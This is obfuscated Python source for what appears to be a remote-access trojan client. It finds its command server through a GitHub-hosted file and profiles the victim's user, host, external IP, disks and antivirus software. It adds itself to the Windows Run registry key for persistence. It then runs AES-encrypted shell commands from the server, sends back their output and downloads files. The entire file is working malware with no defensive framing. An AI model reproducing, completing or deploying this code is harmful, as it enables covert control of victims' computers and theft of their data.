import socket #line:1
import threading #line:2
import subprocess #line:3
import getpass #line:4
import hashlib #line:5
import os #line:6
from Crypto .Cipher import AES #line:7
from Crypto .Util .Padding import unpad #line:8
import base64 #line:9
import shutil #line:10
import time #line:11
import platform #line:12
from Crypto .Util .Padding import pad #line:13
import random #line:14
import psutil #line:15
import sys #line:16
import re #line:17
from pythonping import ping #line:18
import requests #line:19
class Client :#line:22
    def __init__ (O0OO00O0OO00O00O0 ):#line:23
        O0OO00O0OO00O00O0 .conss =30 #line:25
        O0OO00O0OO00O00O0 .time_cons =200 #line:27
        O0OO00O0OO00O00O0 .max_attempts =1000 #line:29
        O0OO00O0OO00O00O0 .system_type =platform .system ()#line:30
        O0OO00O0OO00O00O0 .download_path ="0list" ""#line:32
        O0OO00O0OO00O00O0 .should_receive =True #line:33
        O0OO00O0OO00O00O0 .av_dict ={"360":["360tray.exe","360sd.exe","ZhuDongFangYu.exe"],"huorong":["hipstray.exe","wsctrl.exe","usysdiag.exe"],"qq":["QQPCRTP.exe"],"windows":["MsMpEng.exe"]}#line:39
        O0OO00O0OO00O00O0 .keys =["G8NgeQIxN36HTWCp1","wxOFnEyV7NejfmbH1","O0f2sM4z9UcZW8sr1","zMHDbVKmEsWsHjPw1","3otqqq3k47Jk6qTw1","o1Jend8yzXZSkNCv1","gnP9Cq1QVB711BdI1","AzhEK09Z7cdkZXPC1","565k52inFtn9HBhi1","71GIVhiyDIgwM38x1"]#line:42
        O0OO00O0OO00O00O0 .av_type =""#line:44
        O0OO00O0OO00O00O0 .start_run =""#line:45
        O0OO00O0OO00O00O0 .url =['https://github.com/0xsec0/0xsec1/blob/main/test.txt']#line:46
        O0OO00O0OO00O00O0 .source =""#line:47
        O0OO00O0OO00O00O0 .url_random =''#line:48
        O0OO00O0OO00O00O0 .host =''#line:49
        O0OO00O0OO00O00O0 .port =''#line:50
        O0OO00O0OO00O00O0 .upload_port =1 #line:51
        O0OO00O0OO00O00O0 .disk =""#line:52
        O0OO00O0OO00O00O0 .proxys =None #line:53
        O0OO00O0OO00O00O0 .all_user_agents =['Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0','Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1','Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',]#line:67
    def generate_fixed_key (O00OO0OOOOO00OO00 ):#line:70
        O0OO00O0O0OO0O0OO =random .choice (O00OO0OOOOO00OO00 .keys )#line:71
        return O0OO00O0O0OO0O0OO .encode ()[:16 ]#line:72
    def encrypt_command (OOOO0OO0OOOOOOOOO ,OOO0O0O00OOO0O0OO ):#line:74
        OOOOO000O0OOOOOO0 =AES .new (OOOO0OO0OOOOOOOOO .generate_fixed_key (),AES .MODE_CBC )#line:75
        O000OO0O0O0OOO00O =OOOOO000O0OOOOOO0 .encrypt (pad (OOO0O0O00OOO0O0OO .encode (),AES .block_size ))#line:76
        O00O000OOO0OO0O0O =OOOOO000O0OOOOOO0 .iv #line:77
        return base64 .b64encode (O00O000OOO0OO0O0O +O000OO0O0O0OOO00O )#line:78
    def en_main (OO00OO000O00O0OO0 ,command =None ):#line:80
        if command ==None :#line:81
            return "None"#line:82
        OO0000OO0OOOO0000 =OO00OO000O00O0OO0 .encrypt_command (command )#line:83
        return OO0000OO0OOOO0000 #line:84
    def send_encrypted_result (O00OOO00000OOOO0O ,OOO0000000OO0O0O0 ,O00O0O0000OOO000O ):#line:86
        OOO0O0OOO0OOOOOOO =O00OOO00000OOOO0O .en_main (O00O0O0000OOO000O ).decode ()#line:87
        O00OOO00000OOOO0O .send_result (OOO0000000OO0O0O0 ,OOO0O0OOO0OOOOOOO )#line:88
    def is_pingable (OO0O0OOO00OOO0OO0 ):#line:92
        O0O0OOOOOO0O0000O =ping (OO0O0OOO00OOO0OO0 .host ,count =1 )#line:93
        return O0O0OOOOOO0O0000O .success ()#line:94
    def get_host_port (OOOO0OO0OO0OOO0O0 ):#line:96
        try :#line:97
            OO0OOO0000OO0O00O ={'User-Agent':random .choice (OOOO0OO0OO0OOO0O0 .all_user_agents )}#line:98
            if OOOO0OO0OO0OOO0O0 .system_type =="Windows":#line:99
                OOOO0OO0OO0OOO0O0 .proxies =OOOO0OO0OO0OOO0O0 .get_system_proxy ()#line:100
            elif OOOO0OO0OO0OOO0O0 .system_type =="Linux":#line:101
                OOOO0OO0OO0OOO0O0 .proxies =None #line:102
            OOOO0OO0OO0OOO0O0 .url_random =random .choice (OOOO0OO0OO0OOO0O0 .url )#line:103
            O0OOOO000000OO00O =requests .get (url =OOOO0OO0OO0OOO0O0 .url_random ,headers =OO0OOO0000OO0O00O ,proxies =OOOO0OO0OO0OOO0O0 .proxies ,verify =True )#line:104
            O0OOOO000000OO00O .raise_for_status ()#line:105
            OOO00O0000000O0O0 =re .search (r'https://(\d+\.\d+\.\d+\.\d+)/user/login',O0OOOO000000OO00O .text ).group (1 )#line:106
            OOOO0O0O00OOOO0O0 =int (re .search (r'http://127.0.0.1:(\d+)',O0OOOO000000OO00O .text ).group (1 ))#line:107
            if 'github'in OOOO0OO0OO0OOO0O0 .url_random :#line:108
                OOOO0OO0OO0OOO0O0 .source ="github"#line:109
            elif 'download.botest.org/code.txt'in OOOO0OO0OO0OOO0O0 .url_random :#line:110
                OOOO0OO0OO0OOO0O0 .source ="code"#line:111
            else :#line:112
                OOOO0OO0OO0OOO0O0 .source ="default"#line:114
            print (OOOO0OO0OO0OOO0O0 .url_random )#line:115
            OOOO0OO0OO0OOO0O0 .host =OOO00O0000000O0O0 #line:116
            OOOO0OO0OO0OOO0O0 .port =OOOO0O0O00OOOO0O0 #line:117
            OOOO0OO0OO0OOO0O0 .upload_port =OOOO0OO0OO0OOO0O0 .port +1 #line:118
            return OOOO0OO0OO0OOO0O0 .host ,OOOO0OO0OO0OOO0O0 .port #line:119
        except requests .RequestException as O0OOOOOOOOOO00O0O :#line:121
            print ("再来一次")#line:122
            return None ,None #line:123
    def get_system_proxy (OO0OO00000000O00O ):#line:125
        import winreg #line:127
        OOOOOOO0000O00O0O =r'Software\Microsoft\Windows\CurrentVersion\Internet Settings'#line:128
        try :#line:129
            O0O000OO0OOOOOO0O =winreg .OpenKey (winreg .HKEY_CURRENT_USER ,OOOOOOO0000O00O0O ,access =winreg .KEY_READ )#line:132
            O000OO00O0O0OOOO0 ,_O00O00000O0O00O0O =winreg .QueryValueEx (O0O000OO0OOOOOO0O ,'ProxyEnable')#line:135
            OOOOO000O0OO0000O ,_O00O00000O0O00O0O =winreg .QueryValueEx (O0O000OO0OOOOOO0O ,'ProxyServer')#line:137
            winreg .CloseKey (O0O000OO0OOOOOO0O )#line:140
            if O000OO00O0O0OOOO0 ==1 :#line:143
                if ';'in OOOOO000O0OO0000O and '='in OOOOO000O0OO0000O :#line:146
                    OOO0000O0OOOO00O0 =OOOOO000O0OO0000O .split (';')#line:148
                    O0000OOOOO0OOOO00 ={}#line:149
                    for OOO0OOO0000OO0O00 in OOO0000O0OOOO00O0 :#line:150
                        O00OOOOO0O0O00OO0 ,O0OOOOOO0OOO0O000 =OOO0OOO0000OO0O00 .split ('=',1 )#line:151
                        O0000OOOOO0OOOO00 [O00OOOOO0O0O00OO0 ]=O0OOOOOO0OOO0O000 #line:152
                    return O0000OOOOO0OOOO00 #line:153
                else :#line:154
                    return {'http':OOOOO000O0OO0000O ,'https':OOOOO000O0OO0000O ,}#line:159
            else :#line:160
                return None #line:161
        except FileNotFoundError :#line:162
            return None #line:164
        except OSError :#line:165
            return None #line:167
    def get_disk_partitions_str (OOO0000000OOO0000 ):#line:169
        O000O0O00OOOOOO00 =psutil .disk_partitions ()#line:170
        OO0OOO0000OOOO0OO =[O00OO0OO000OO0O0O .device .replace ("\\","").replace (":","")for O00OO0OO000OO0O0O in O000O0O00OOOOOO00 if O00OO0OO000OO0O0O .device ]#line:172
        return ",".join (OO0OOO0000OOOO0OO )#line:173
    def get_username (O000000O00OOOO000 ):#line:175
        return getpass .getuser ()#line:176
    def get_ssid (OOO00OO0OO0000OO0 ):#line:178
        if OOO00OO0OO0000OO0 .system_type =='Windows':#line:179
            OOOO0O000O0OO0OOO =os .environ ['COMPUTERNAME']#line:180
            O0O00OOO0000OOOOO =os .environ ['USERNAME']#line:181
            O00OOO0O00O0O0OOO =os .environ ['SystemDrive']#line:182
        elif OOO00OO0OO0000OO0 .system_type =='Linux':#line:183
            OOOO0O000O0OO0OOO =platform .node ()#line:184
            O0O00OOO0000OOOOO =os .getenv ('USER')#line:185
            O00OOO0O00O0O0OOO ='/tmp'#line:186
        else :#line:187
            raise NotImplementedError (f"Unsupported operating system: {OOO00OO0OO0000OO0.system_type}")#line:188
        O0OOOO00O0000O0OO =hashlib .md5 (f"{OOOO0O000O0OO0OOO}{O0O00OOO0000OOOOO}{O00OOO0O00O0O0OOO}".encode ()).hexdigest ()#line:190
        return O0OOOO00O0000O0OO #line:191
    def get_ip_addr (O00OOO00000000000 ):#line:193
        try :#line:194
            OOOO0O0OOO00OOOOO =requests .get ('https://www.myexternalip.com/raw',verify =False ).text #line:195
            if OOOO0O0OOO00OOOOO is not None :#line:196
                return OOOO0O0OOO00OOOOO #line:197
            else :#line:198
                return "None"#line:199
        except Exception :#line:200
            OOOO0O0OOO00OOOOO ='None'#line:201
        return OOOO0O0OOO00OOOOO #line:203
    def connect (O000O0OOOOOOOO000 ,O00OO00O0OOO000OO ,OO0OO0O00O000O00O ,OO00OO0O00000000O ,OOO00O000O0O000O0 ,OOOO0O00O00OOO00O ):#line:205
        O00O000O000OOO0O0 =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:206
        try :#line:207
            O00O000O000OOO0O0 .connect ((O00OO00O0OOO000OO ,OO0OO0O00O000O00O ))#line:208
            O0OOO0OOO0OO00OOO =f"{OO00OO0O00000000O}:{OOO00O000O0O000O0}:{O000O0OOOOOOOO000.system_type}:{OOOO0O00O00OOO00O}:{O000O0OOOOOOOO000.av_type}:{O000O0OOOOOOOO000.start_run}:{O000O0OOOOOOOO000.source}:{O000O0OOOOOOOO000.disk}"#line:209
            print (O0OOO0OOO0OO00OOO )#line:210
            O00O000O000OOO0O0 .send (O0OOO0OOO0OO00OOO .encode ('utf-8'))#line:211
            O00OO00O0O0OO0000 =threading .Thread (target =O000O0OOOOOOOO000 .receive ,args =(O00O000O000OOO0O0 ,))#line:213
            O00OO00O0O0OO0000 .start ()#line:214
            return True ,O00O000O000OOO0O0 #line:216
        except (socket .error ,ConnectionRefusedError ):#line:217
            return False ,None #line:218
    def generate_fixed_keys (O0OO000O00O00O0OO ):#line:220
        return [O0000OO00OO0O0O00 .encode ()[:16 ]for O0000OO00OO0O0O00 in O0OO000O00O00O0OO .keys ]#line:222
    def decrypt_and_print (O00O0OO00000000OO ,O00O0OOOOO00OO0OO ,O0OOO0O000O00OO0O ):#line:224
        OOOO0OO0O00OOO000 =O0OOO0O000O00OO0O .encode ()[:16 ]#line:225
        OO0OO0O0OO000OOO0 =O00O0OO00000000OO .decrypt (O00O0OOOOO00OO0OO ,OOOO0OO0O00OOO000 )#line:226
        if OO0OO0O0OO000OOO0 is not None :#line:227
            OOOOO0O0O000O0O00 =OO0OO0O0OO000OOO0 #line:228
            return OOOOO0O0O000O0O00 #line:229
        else :#line:230
            return None #line:231
    def decrypt (OOOOO0OOOO00OO00O ,O00OOO0O000000OO0 ,O000OO00OOOO0O0O0 ):#line:233
        try :#line:234
            O0O00O0OO0O00O0O0 =base64 .b64decode (O00OOO0O000000OO0 )#line:235
            OO0O0OOO00O00OOOO =O0O00O0OO0O00O0O0 [:AES .block_size ]#line:236
            OO000000O0OO0O0OO =AES .new (O000OO00OOOO0O0O0 ,AES .MODE_CBC ,OO0O0OOO00O00OOOO )#line:237
            OOOOO00O0000O0OO0 =unpad (OO000000O0OO0O0OO .decrypt (O0O00O0OO0O00O0O0 [AES .block_size :]),AES .block_size )#line:238
            return OOOOO00O0000O0OO0 .decode ()#line:239
        except Exception as OOO0O0OOOO00O00OO :#line:240
            return None #line:241
    def receive (O0O00O0O0OOO0OO0O ,OOOO000O0O00OOO0O ):#line:243
        OOO0OOOOO000O0OOO =None #line:244
        while True :#line:246
            try :#line:247
                OO0000OOO0000OOO0 =OOOO000O0O00OOO0O .recv (3072 ).decode ('utf-8')#line:248
                if not OO0000OOO0000OOO0 :#line:249
                    pass #line:250
                if OO0000OOO0000OOO0 =="upload":#line:252
                    O0O0OO0O00OO0OOOO =threading .Thread (target =O0O00O0O0OOO0OO0O .download_file ,args =())#line:253
                    O0O0OO0O00OO0OOOO .start ()#line:254
                elif OO0000OOO0000OOO0 !="upload":#line:255
                    for O0O0OO0O00OOO0O00 in O0O00O0O0OOO0OO0O .keys :#line:256
                        OOOO000O0O000O000 =O0O00O0O0OOO0OO0O .decrypt_and_print (OO0000OOO0000OOO0 ,O0O0OO0O00OOO0O00 )#line:257
                        if OOOO000O0O000O000 is not None :#line:258
                            OOO0OOOOO000O0OOO =OOOO000O0O000O000 #line:259
                    try :#line:261
                        if OOO0OOOOO000O0OOO is not None :#line:262
                            O0O00O0O0OOO0OO0O .send_encrypted_result (OOOO000O0O00OOO0O ,O0O00O0O0OOO0OO0O .execute_command (OOO0OOOOO000O0OOO ))#line:263
                        else :#line:264
                            break #line:265
                    except :#line:266
                        break #line:267
            except ConnectionResetError :#line:268
                if O0O00O0O0OOO0OO0O .main ():#line:269
                    return True #line:270
        return False #line:271
    def execute_command (O0OO0O0000O0OO0O0 ,O0OO0O0OOO00O0O0O ):#line:273
        try :#line:274
            if not O0OO0O0OOO00O0O0O .strip ():#line:275
                return "空指令"#line:276
            O000OOOOO00OOO0O0 =O0OO0O0OOO00O0O0O .split ()#line:278
            if O000OOOOO00OOO0O0 [0 ].lower ()=='cd':#line:279
                try :#line:280
                    os .chdir (O000OOOOO00OOO0O0 [1 ])#line:281
                    return os .getcwd ()#line:282
                except FileNotFoundError :#line:283
                    return f"找不到路径：[{O000OOOOO00OOO0O0[1]}]"#line:284
                except OSError :#line:285
                    return f"文件名、目录名或卷标语法不正确：'{O000OOOOO00OOO0O0[1]}'"#line:286
            elif O0OO0O0OOO00O0O0O =="pwd":#line:288
                if O0OO0O0000O0OO0O0 .system_type =="Linux":#line:289
                    O00O00O00OO000O00 =subprocess .run ("pwd",shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,text =True )#line:291
                    O0OO0O0000O0OO0O0 .download_path =O00O00O00OO000O00 .stdout #line:292
                    return O00O00O00OO000O00 .stdout #line:293
                if O0OO0O0000O0OO0O0 .system_type =="Windows":#line:294
                    O00O00O00OO000O00 =subprocess .run ("echo %cd%",shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,text =True )#line:296
                    return O00O00O00OO000O00 .stdout #line:297
            elif O0OO0O0OOO00O0O0O =="ls":#line:298
                if O0OO0O0000O0OO0O0 .system_type =="Linux":#line:299
                    O00O00O00OO000O00 =subprocess .run ("ls",shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,text =True )#line:300
                    O0OO0O0000O0OO0O0 .download_path =O00O00O00OO000O00 .stdout #line:301
                    return O00O00O00OO000O00 .stdout #line:302
                if O0OO0O0000O0OO0O0 .system_type =="Windows":#line:303
                    O00O00O00OO000O00 =subprocess .run ("dir",shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,text =True )#line:305
                    return O00O00O00OO000O00 .stdout #line:306
            elif O0OO0O0OOO00O0O0O =="exit":#line:307
                exit ()#line:308
            else :#line:309
                O00O00O00OO000O00 =subprocess .run (O0OO0O0OOO00O0O0O ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,text =True )#line:310
                return O00O00O00OO000O00 .stdout #line:311
        except subprocess .CalledProcessError as O000000O0OO0OOO0O :#line:312
            return O000000O0OO0OOO0O .stderr .strip ()if O000000O0OO0OOO0O .stderr else O000000O0OO0OOO0O .stdout .strip ()#line:313
    def send_result (O0OOOO00OO0O000O0 ,O0O00O000000OO00O ,OOO0000O000OOOO0O ):#line:315
        try :#line:316
            O00000O0OO00OOO00 =OOO0000O000OOOO0O .encode ('utf-8')#line:318
            O00OOO00000OOOO00 =str (len (O00000O0OO00OOO00 )).zfill (6 )#line:321
            O0O00O000000OO00O .send (O00OOO00000OOOO00 .encode ('utf-8'))#line:322
            O0O00O000000OO00O .send (O00000O0OO00OOO00 )#line:325
        except BrokenPipeError :#line:328
            print ("服务器下线")#line:329
            O0OOOO00OO0O000O0 .main ()#line:330
        except Exception as OO0OO0OO00O00000O :#line:331
            print (f"发送结果错误: {OO0OO0OO00O00000O}")#line:332
    def download_file (OOO00000O00O0O0O0 ):#line:335
        with socket .socket (socket .AF_INET ,socket .SOCK_STREAM )as OO0O00OO000000O00 :#line:336
            try :#line:337
                OO0O00OO000000O00 .connect ((OOO00000O00O0O0O0 .host ,OOO00000O00O0O0O0 .upload_port ))#line:338
                O0O000OO0O0O000O0 =OO0O00OO000000O00 .recv (2048 ).decode ()#line:339
                OOO0OO0OOO0O00OO0 =os .path .join (O0O000OO0O0O000O0 )#line:340
                with open (OOO0OO0OOO0O00OO0 ,'wb')as OOOO000O00O00O0OO :#line:341
                    shutil .copyfileobj (OO0O00OO000000O00 .makefile ('rb'),OOOO000O00O00O0OO )#line:342
            except FileNotFoundError :#line:344
                pass #line:345
            except Exception :#line:346
                pass #line:347
    def main (O0O00O0000OO00O00 ):#line:349
        O000O0OOO0O00O00O =O0O00O0000OO00O00 .get_ssid ()#line:350
        O00000OOO0O00O0O0 =O0O00O0000OO00O00 .get_username ()#line:351
        O0OOO0O00OOO000OO =O0O00O0000OO00O00 .get_ip_addr ()#line:352
        while True :#line:354
            O0O00O0000OO00O00 .host ,O0O00O0000OO00O00 .port =O0O00O0000OO00O00 .get_host_port ()#line:355
            print (O0O00O0000OO00O00 .host ,O0O00O0000OO00O00 .port )#line:356
            if O0O00O0000OO00O00 .host and O0O00O0000OO00O00 .port :#line:357
                break #line:358
            else :#line:359
                time .sleep (1 )#line:360
        while True :#line:362
            try :#line:363
                if O0O00O0000OO00O00 .is_pingable ():#line:364
                    O0O00O0000OO00O00 .conss =30 #line:365
                    print (f"ping通时间是:{O0O00O0000OO00O00.conss}")#line:366
                    print (f"当前 IP 和端口: {O0O00O0000OO00O00.host}:{O0O00O0000OO00O00.port}")#line:367
                    OOOOO0000000OO000 ,OOOO00OO0000OOO0O =O0O00O0000OO00O00 .connect (O0O00O0000OO00O00 .host ,O0O00O0000OO00O00 .port ,O00000OOO0O00O0O0 ,O000O0OOO0O00O00O ,O0OOO0O00OOO000OO )#line:368
                    O0O00O0000OO00O00 .receive (OOOO00OO0000OOO0O )#line:369
                    time .sleep (O0O00O0000OO00O00 .conss )#line:370
                else :#line:371
                    O0O00O0000OO00O00 .conss =3600 #line:372
                    O0O00O0000OO00O00 .get_host_port ()#line:373
                    print (O0O00O0000OO00O00 .conss )#line:374
                    time .sleep (O0O00O0000OO00O00 .conss )#line:375
            except Exception as OO00O0OOO0O0OOOOO :#line:376
                if O0O00O0000OO00O00 .system_type =="Linux":#line:377
                    print ("请用sudo执行")#line:378
                    exit ()#line:379
                time .sleep (O0O00O0000OO00O00 .conss )#line:380
    def is_process_running (OOO0O0O00OOOO0O00 ,OOO00O00O00O0OOO0 ):#line:382
        OOO00O00O00O0OOO0 =OOO00O00O00O0OOO0 .lower ()#line:383
        for OOOO0000OOOO0OOOO in psutil .process_iter (['pid','name']):#line:384
            if OOOO0000OOOO0OOOO .info ['name'].lower ()==OOO00O00O00O0OOO0 :#line:385
                return True #line:386
        return False #line:387
    def AV_shibie (O000OO0OOOOO00O0O ):#line:389
        OOO0O0000O0000O00 =any (O000OO0OOOOO00O0O .is_process_running (OO0O0O0OO000O0O00 )for OO0000O000OO00O00 in O000OO0OOOOO00O0O .av_dict .values ()for OO0O0O0OO000O0O00 in OO0000O000OO00O00 )#line:392
        if not OOO0O0000O0000O00 :#line:394
            O000OO0OOOOO00O0O .reg_path_exe ()#line:395
            O000OO0OOOOO00O0O .av_type ="look"#line:396
            return #line:397
        for O000OO000OO00O000 ,O00000OO0OOO0O000 in O000OO0OOOOO00O0O .av_dict .items ():#line:399
            for OOO0OOOO0OO00000O in O00000OO0OOO0O000 :#line:400
                if O000OO0OOOOO00O0O .is_process_running (OOO0OOOO0OO00000O ):#line:401
                    if O000OO000OO00O000 =="360":#line:402
                        O000OO0OOOOO00O0O .av_type ="360"#line:403
                    elif O000OO000OO00O000 in ("huorong","qq","windows"):#line:405
                        if O000OO000OO00O000 =="qq":#line:406
                            O000OO0OOOOO00O0O .reg_path_exe ()#line:407
                            O000OO0OOOOO00O0O .av_type ="腾讯电脑管家"#line:408
                        elif O000OO000OO00O000 =="windows":#line:409
                            O000OO0OOOOO00O0O .av_type ="Windows Defender"#line:410
                        elif O000OO000OO00O000 =="huorong":#line:411
                            O000OO0OOOOO00O0O .av_type ="火绒安全软件"#line:412
                            O000OO0OOOOO00O0O .reg_path_exe ()#line:413
                        elif O000OO000OO00O000 =="360":#line:414
                            O000OO0OOOOO00O0O .av_type ="360安全软件"#line:415
                        else :#line:416
                            O000OO0OOOOO00O0O .av_type ="You look"#line:417
                    else :#line:418
                        O000OO0OOOOO00O0O .av_type ="You look"#line:419
                    return #line:420
    def reg_path_exe (O00OO0000OOO0O000 ):#line:422
        OO0O0000O00OO0OO0 =sys .argv [0 ]#line:423
        OO0OO0O00000OO00O ="myhosts"#line:424
        O0O000OOOOO00O000 =f'reg query HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v {OO0OO0O00000OO00O}'#line:427
        O00000O0O0O0O0000 =subprocess .run (O0O000OOOOO00O000 ,shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,text =True )#line:429
        if OO0OO0O00000OO00O in O00000O0O0O0O0000 .stdout :#line:431
            O00OO0000OOO0O000 .start_run ="yes"#line:432
        else :#line:433
            O0OOO0O0O000OO0OO =f'reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v {OO0OO0O00000OO00O} /t reg_sz /d "{OO0O0000O00OO0OO0}"'#line:435
            os .system (O0OOO0O0O000OO0OO )#line:436
            O00OO0000OOO0O000 .start_run ="yes"#line:437
if __name__ =="__main__":#line:440
    client =Client ()#line:441
    if client .system_type =="Windows":#line:442
        client .AV_shibie ()#line:443
        client .disk =client .get_disk_partitions_str ()#line:444
    elif client .system_type =="Linux":#line:445
        client .av_type ="linux not"#line:446
        client .start_run ="linux not"#line:447
        client .disk ="linux not"#line:448
    client .main ()#line:449
